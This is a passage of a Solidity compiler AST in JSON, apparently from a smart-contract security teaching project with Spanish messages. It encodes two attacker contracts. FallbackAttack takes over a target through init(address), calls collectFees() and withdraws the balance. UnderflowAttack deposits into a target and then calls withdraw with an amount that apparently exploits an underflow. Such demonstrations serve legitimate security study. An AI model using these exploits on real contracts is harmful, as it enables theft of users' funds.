																{
																	"argumentTypes": null,
																	"hexValue": "696e6974286164647265737329",
																	"id": 260,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "7360:15:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_19ab453cff53dab05fc3f2d48c3c48db21397e0117c6a600ff7766615fc520d6",
																		"typeString": "literal_string \"init(address)\""
																	},
																	"value": "init(address)"
																},
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 263,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": -28,
																			"src": "7385:4:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_FallbackAttack_$299",
																				"typeString": "contract FallbackAttack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_FallbackAttack_$299",
																				"typeString": "contract FallbackAttack"
																			}
																		],
																		"id": 262,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "7377:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 261,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "7377:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 264,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "7377:13:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_stringliteral_19ab453cff53dab05fc3f2d48c3c48db21397e0117c6a600ff7766615fc520d6",
																		"typeString": "literal_string \"init(address)\""
																	},
																	{
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 258,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -1,
																	"src": "7336:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 259,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodeWithSignature",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "7336:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function (string memory) pure returns (bytes memory)"
																}
															},
															"id": 265,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7336:55:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 255,
															"name": "attackedContract",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 242,
															"src": "7314:16:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 257,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "7314:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 266,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7314:78:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 267,
												"nodeType": "ExpressionStatement",
												"src": "7314:78:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "636f6c6c656374466565732829",
																	"id": 273,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "7495:15:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_c87965729e990b38dc13add724e6bf71c0eff34ca4b94316d8a69582421de2a9",
																		"typeString": "literal_string \"collectFees()\""
																	},
																	"value": "collectFees()"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_stringliteral_c87965729e990b38dc13add724e6bf71c0eff34ca4b94316d8a69582421de2a9",
																		"typeString": "literal_string \"collectFees()\""
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 271,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -1,
																	"src": "7471:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 272,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodeWithSignature",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "7471:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function (string memory) pure returns (bytes memory)"
																}
															},
															"id": 274,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7471:40:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 268,
															"name": "attackedContract",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 242,
															"src": "7449:16:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 270,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "7449:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 275,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7449:63:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 276,
												"nodeType": "ExpressionStatement",
												"src": "7449:63:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "9e5faafc",
									"id": 278,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 253,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7199:2:0"
									},
									"returnParameters": {
										"id": 254,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7210:0:0"
									},
									"scope": 299,
									"src": "7184:336:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 293,
										"nodeType": "Block",
										"src": "7670:61:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 288,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -28,
																		"src": "7709:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_FallbackAttack_$299",
																			"typeString": "contract FallbackAttack"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_FallbackAttack_$299",
																			"typeString": "contract FallbackAttack"
																		}
																	],
																	"id": 287,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "7701:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 286,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "7701:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 289,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "7701:13:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 290,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "7701:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 281,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -15,
																"src": "7681:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 284,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "7681:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 285,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "7681:19:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 291,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7681:42:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 292,
												"nodeType": "ExpressionStatement",
												"src": "7681:42:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "24600fc3",
									"id": 294,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdrawFunds",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 279,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7658:2:0"
									},
									"returnParameters": {
										"id": 280,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7670:0:0"
									},
									"scope": 299,
									"src": "7636:95:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 297,
										"nodeType": "Block",
										"src": "7803:3:0",
										"statements": []
									},
									"documentation": null,
									"id": 298,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 295,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7783:2:0"
									},
									"returnParameters": {
										"id": 296,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7803:0:0"
									},
									"scope": 299,
									"src": "7776:30:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 385,
							"src": "6925:884:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 384,
							"linearizedBaseContracts": [
								384
							],
							"name": "UnderflowAttack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 301,
									"name": "attackedContract",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 384,
									"src": "7847:24:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 300,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "7847:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 310,
										"nodeType": "Block",
										"src": "7980:82:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 308,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 306,
														"name": "attackedContract",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 301,
														"src": "7991:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 307,
														"name": "at_contract",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 303,
														"src": "8010:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "7991:30:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 309,
												"nodeType": "ExpressionStatement",
												"src": "7991:30:0"
											}
										]
									},
									"documentation": null,
									"id": 311,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 304,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 303,
												"name": "at_contract",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 311,
												"src": "7952:19:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 302,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "7952:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7951:21:0"
									},
									"returnParameters": {
										"id": 305,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7980:0:0"
									},
									"scope": 384,
									"src": "7940:122:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 340,
										"nodeType": "Block",
										"src": "8106:269:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 318,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 315,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -15,
																	"src": "8125:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 316,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "8125:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "313030",
																"id": 317,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "8137:3:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_100_by_1",
																	"typeString": "int_const 100"
																},
																"value": "100"
															},
															"src": "8125:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "486173206465706f73697461646f20756e612063616e74696461642064656d61736961646f207065717565c3b161",
															"id": 319,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8142:48:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_f371fbdb092f2395cc186dbc470c83e478621c58586470025de75a9dadaec15c",
																"typeString": "literal_string \"Has depositado una cantidad demasiado pequeña\""
															},
															"value": "Has depositado una cantidad demasiado pequeña"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_f371fbdb092f2395cc186dbc470c83e478621c58586470025de75a9dadaec15c",
																"typeString": "literal_string \"Has depositado una cantidad demasiado pequeña\""
															}
														],
														"id": 314,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "8117:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 320,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8117:74:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 321,
												"nodeType": "ExpressionStatement",
												"src": "8117:74:0"
											},
											{
												"assignments": [
													323,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 323,
														"name": "success",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 340,
														"src": "8205:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 322,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "8205:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 334,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "6465706f7369742829",
																	"id": 331,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8284:11:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_d0e30db03f2e24c6531d8ae2f6c09d8e7a6ad7f7e87a81cb75dfda61c9d83286",
																		"typeString": "literal_string \"deposit()\""
																	},
																	"value": "deposit()"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_stringliteral_d0e30db03f2e24c6531d8ae2f6c09d8e7a6ad7f7e87a81cb75dfda61c9d83286",
																		"typeString": "literal_string \"deposit()\""
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 329,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -1,
																	"src": "8260:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 330,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodeWithSignature",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "8260:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function (string memory) pure returns (bytes memory)"
																}
															},
															"id": 332,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8260:36:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 324,
																"name": "attackedContract",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 301,
																"src": "8221:16:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 325,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "call",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "8221:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
															}
														},
														"id": 328,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 326,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -15,
																	"src": "8249:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 327,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "8249:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"src": "8221:38:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 333,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8221:76:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8204:93:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 336,
															"name": "success",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 323,
															"src": "8316:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "4e6f2068616269646f20657869746f2061206c6120686f7261206465206465706f73697461722e",
															"id": 337,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8325:41:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_2bd668f41fffb78302e8c697e28a55342028dddd51ffab0533d7565fd1f96173",
																"typeString": "literal_string \"No habido exito a la hora de depositar.\""
															},
															"value": "No habido exito a la hora de depositar."
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_2bd668f41fffb78302e8c697e28a55342028dddd51ffab0533d7565fd1f96173",
																"typeString": "literal_string \"No habido exito a la hora de depositar.\""
															}
														],
														"id": 335,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "8308:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 338,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8308:59:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 339,
												"nodeType": "ExpressionStatement",
												"src": "8308:59:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "d0e30db0",
									"id": 341,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "deposit",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 312,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "8086:2:0"
									},
									"returnParameters": {
										"id": 313,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "8106:0:0"
									},
									"scope": 384,
									"src": "8070:305:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 362,
										"nodeType": "Block",
										"src": "8425:265:0",
										"statements": [
											{
												"assignments": [
													347,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 347,
														"name": "success",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 362,
														"src": "8516:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 346,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "8516:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 356,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "77697468647261772875696e7432353629",
																	"id": 352,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8578:19:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_2e1a7d4d13322e7b96f9a57413e1525c250fb7a9021cf91d1540d5b69f16a49f",
																		"typeString": "literal_string \"withdraw(uint256)\""
																	},
																	"value": "withdraw(uint256)"
																},
																{
																	"argumentTypes": null,
																	"id": 353,
																	"name": "cantidad",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 343,
																	"src": "8599:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_stringliteral_2e1a7d4d13322e7b96f9a57413e1525c250fb7a9021cf91d1540d5b69f16a49f",
																		"typeString": "literal_string \"withdraw(uint256)\""
																	},
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 350,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -1,
																	"src": "8554:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 351,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodeWithSignature",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "8554:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function (string memory) pure returns (bytes memory)"
																}
															},
															"id": 354,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8554:54:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 348,
															"name": "attackedContract",
															"nodeType": "Identifier",
